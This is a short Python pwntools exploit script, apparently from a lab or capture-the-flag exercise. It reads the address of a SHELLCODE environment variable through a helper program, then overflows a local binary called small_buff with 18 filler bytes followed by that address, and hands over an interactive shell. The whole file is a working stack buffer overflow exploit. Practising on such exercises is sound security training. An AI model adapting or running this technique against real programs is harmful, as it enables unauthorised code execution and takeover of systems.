#!usr/bin/env python3
#small_buff_exp.py

from pwn import *

context.update(os="linux", arch="i386")
env_name = "SHELLCODE"
getenv_process = process(['./get_env', env_name])
env_address = p32(int(getenv_process.readline().strip(), 16))
print(env_address)
getenv_process.close()

payload = b'A'*18 + env_address
print(payload)
p = process(['./small_buff', payload])
p.interactive()
